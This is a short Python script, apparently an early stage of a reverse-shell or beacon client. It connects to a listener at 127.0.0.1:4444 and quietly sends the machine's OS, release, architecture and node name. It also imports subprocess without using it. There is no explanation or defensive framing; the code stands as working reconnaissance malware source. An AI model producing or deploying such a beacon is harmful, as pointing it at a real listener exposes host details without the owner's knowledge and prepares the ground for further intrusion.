import platform
from socket import *
import subprocess as sub


s = socket(2,1)
s.connect_ex(("127.0.0.1",4444))

data = 'os = '+platform.uname()[0]+''+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
data += 'node = '+platform.node()+'\n'
data += 'User = '+platform.uname()[1]+'\n'
data += 'system Type = '+platform.uname()[5]+'\n'

s.send((str(data)).encode())


s.close()

